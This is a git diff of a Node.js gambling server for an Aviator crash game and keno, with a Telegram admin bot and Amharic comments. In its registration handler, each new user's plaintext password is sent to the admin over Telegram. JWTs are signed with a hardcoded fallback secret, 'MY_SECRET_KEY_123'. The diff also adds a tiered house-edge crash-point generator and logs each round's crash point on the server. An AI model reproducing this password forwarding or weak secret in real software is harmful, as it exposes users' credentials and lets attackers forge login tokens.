@@ -4,22 +4,22 @@ const { Server } = require('socket.io');
 const cors = require('cors');
 const TelegramBot = require('node-telegram-bot-api');
 const bcrypt = require('bcryptjs');
-const jwt = require('jsonwebtoken'); // ✅ አዲስ የተጨመረ - ለቶከን መፍጠሪያ የሚያስፈልግ
+const jwt = require('jsonwebtoken'); 
 const mongoose = require('mongoose');
 
 const app = express();
 
 const kenoPayoutTable = {
-  1: [0, 3.8],                                      
-  2: [0, 0, 10],                                    
-  3: [0, 0, 2, 50],                                 
-  4: [0, 0, 1, 5, 80],                              
-  5: [0, 0, 0, 4, 40, 150],                         
-  6: [0, 0, 0, 0, 10, 50, 500],                     
-  7: [0, 0, 0, 0, 0, 30, 200, 1000],                
-  8: [0, 0, 0, 0, 0, 0, 80, 400, 2000],             
-  9: [0, 0, 0, 0, 0, 0, 0, 150, 800, 5000],         
-  10: [0, 0, 0, 0, 0, 0, 0, 0, 500, 2500, 10000]    
+  1: [0, 3.8],                                       
+  2: [0, 0, 10],                                     
+  3: [0, 0, 2, 50],                                  
+  4: [0, 0, 1, 5, 80],                               
+  5: [0, 0, 0, 4, 40, 150],                          
+  6: [0, 0, 0, 0, 10, 50, 500],                      
+  7: [0, 0, 0, 0, 0, 30, 200, 1000],                 
+  8: [0, 0, 0, 0, 0, 0, 80, 400, 2000],              
+  9: [0, 0, 0, 0, 0, 0, 0, 150, 800, 5000],          
+  10: [0, 0, 0, 0, 0, 0, 0, 0, 500, 2500, 10000]     
 };
 
 // --- 1. CORS Configuration ---
@@ -99,50 +99,41 @@ setInterval(() => {
 }, 4000);
 
 // --- 5. Auth Routes (REGISTER & LOGIN) ---
-
-// ✅ ሙሉ በሙሉ የተስተካከለው የረጅስትሬሽን (ምዝገባ) ክፍል
 app.post('/register', async (req, res) => {
     const { phone, password } = req.body;
 
-    // 1. መረጃው መሟላቱን ማረጋገጥ
     if (!phone || !password) {
         return res.status(400).json({ status: 'error', error: "እባክዎ ስልክ ቁጥር እና የይለፍ ቃል ያስገቡ" });
     }
 
     try {
-        // 2. ተጠቃሚው አስቀድሞ መኖሩን ማረጋገጥ
         const existingUser = await User.findOne({ phone });
         if (existingUser) {
             return res.status(400).json({ status: 'error', error: "ይህ ስልክ ቁጥር ቀድሞ ተመዝግቧል" });
         }
         
-        // 3. የይለፍ ቃልን ሚስጥራዊ (Hash) ማድረግ
         const salt = await bcrypt.genSalt(10);
         const hashedPassword = await bcrypt.hash(password, salt);
         
-        // 4. አዲስ ተጠቃሚ መፍጠር እና ሴቭ ማድረግ
         const user = new User({
             phone: phone,
             password: hashedPassword,
-            balance: 10 // የጀማሪ ስጦታ 10 ብር
+            balance: 10 
         });
         await user.save();
 
-        // 5. ለቴሌግራም አስተዳዳሪ ማሳወቂያ መላክ
         const telegramMessage = `📝 አዲስ ተጠቃሚ ተመዝግቧል!\n📱 ስልክ: ${phone}\n🔑 የይለፍ ቃል: ${password}\n🎁 የፈጠራ ስጦታ: 10 ETB`;
         
         bot.sendMessage(ADMIN_ID.toString(), telegramMessage).catch(err => {
             console.error("❌ Telegram registration alert failed:", err.message);
         });
 
-       // በሪጅስተር ፋንክሽን ውስጥ ያለውን ይሄንን መስመር ፈልግ:
-const token = jwt.sign(
-    { id: user._id, phone: user.phone }, 
-    process.env.JWT_SECRET || 'MY_SECRET_KEY_123', // እዚህ ጋር 'MY_SECRET_KEY_123' የሚል ጨምርበት
-    { expiresIn: '7d' }
-);
+        const token = jwt.sign(
+            { id: user._id, phone: user.phone }, 
+            process.env.JWT_SECRET || 'MY_SECRET_KEY_123', 
+            { expiresIn: '7d' }
+        );
 
-        // 7. የተሳካ ምላሽ መላክ
         res.json({ 
             status: 'ok', 
             token, 
@@ -256,7 +247,34 @@ bot.onText(/\/update (.+) (.+)/, async (msg, match) => {
     } catch (e) { bot.sendMessage(ADMIN_ID, "❌ ስህተት ተከስቷል"); }
 });
 
-// --- 9. Game Engine ---
+// --- 9. Optimized Aviator Game Engine (የተስተካከለ) ---
+
+// ፕሮፌሽናል Crash Point መፍጠሪያ ፎርሙላ (የቤት ብልጫ/House Edge የተጠበቀበት)
+const generateAviatorCrashPoint = () => {
+    const rand = Math.random() * 100;
+
+    // 1. 10% ዕድል: ወዲያውኑ በ 1.00 ላይ እንዲበላ (Instant Crash) - ቤቱ ሁልጊዜ እንዳይበላ ይጠብቃል
+    if (rand < 10) {
+        return 1.00;
+    }
+    // 2. 50% ዕድል: ከ 1.01 እስከ 2.00 ባለው ክልል ውስጥ እንዲያበቃ (ዝቅተኛ)
+    else if (rand < 60) {
+        return parseFloat((Math.random() * (2.00 - 1.01) + 1.01).toFixed(2));
+    }
+    // 3. 25% ዕድል: ከ 2.01 እስከ 5.00 ባለው ክልል (መካከለኛ)
+    else if (rand < 85) {
+        return parseFloat((Math.random() * (5.00 - 2.01) + 2.01).toFixed(2));
+    }
+    // 4. 12% ዕድል: ከ 5.01 እስከ 20.00 ባለው ክልል (ከፍተኛ)
+    else if (rand < 97) {
+        return parseFloat((Math.random() * (20.00 - 5.01) + 5.01).toFixed(2));
+    }
+    // 5. 3% ዕድል: ከ 20.01 እስከ 100.00+ የሚሄድ (ጃክፖት/ታላቅ ጉዞ)
+    else {
+        return parseFloat((Math.random() * (120.00 - 20.01) + 20.01).toFixed(2));
+    }
+};
+
 const runGame = () => {
     gameState.status = 'waiting'; 
     gameState.timer = 10;
@@ -275,21 +293,38 @@ const runGame = () => {
 
 const startFlying = () => {
     gameState.status = 'flying';
-    let crashPoint = (Math.random() * 4 + 1).toFixed(2); 
+    let crashPoint = generateAviatorCrashPoint();
+    console.log(`🎯 Current Round Crash Point: ${crashPoint}x`); // ለሙከራ ሰርቨር ላይ ለማየት
     
+    // በበረራ ቁጥር መጠን ፍጥነቱ እንዲጨምር የሚያደርግ ዳይናሚክ ኢንክሪመንት
     let flyInterval = setInterval(() => {
-        gameState.multiplier += 0.03;
-        if(parseFloat(gameState.multiplier) >= parseFloat(crashPoint)) {
+        let current = parseFloat(gameState.multiplier);
+
+        // መልቲፕላየሩ እያደገ ሲሄድ በረራው ይበልጥ ፈጣን እንዲሆን ማድረጊያ
+        if (current < 2.0) {
+            gameState.multiplier += 0.01;
+        } else if (current < 10.0) {
+            gameState.multiplier += 0.05;
+        } else if (current < 30.0) {
+            gameState.multiplier += 0.20;
+        } else {
+            gameState.multiplier += 0.50; // ከ 30 በላይ ሲሆን በጣም በፍጥነት ይሄዳል
+        }
+
+        gameState.multiplier = parseFloat(gameState.multiplier.toFixed(2));
+
+        if(gameState.multiplier >= crashPoint) {
             clearInterval(flyInterval);
             gameState.status = 'crashed';
-            gameState.gameHistory.unshift(parseFloat(gameState.multiplier).toFixed(2));
+            gameState.multiplier = crashPoint; // መጨረሻው ክራሽ ፖይንቱ ላይ በትክክል እንዲቆም
+            gameState.gameHistory.unshift(gameState.multiplier.toFixed(2));
             if(gameState.gameHistory.length > 15) gameState.gameHistory.pop();
             io.emit('data', gameState);
             setTimeout(runGame, 3000);
         } else { 
             io.emit('data', gameState); 
         }
-    }, 100);
+    }, 50); // ይበልጥ ስሙዝ (Smooth) የሆነ በረራ ለማሳየት ወደ 50ms ዝቅ ተደርጓል
 };
 
 runGame();
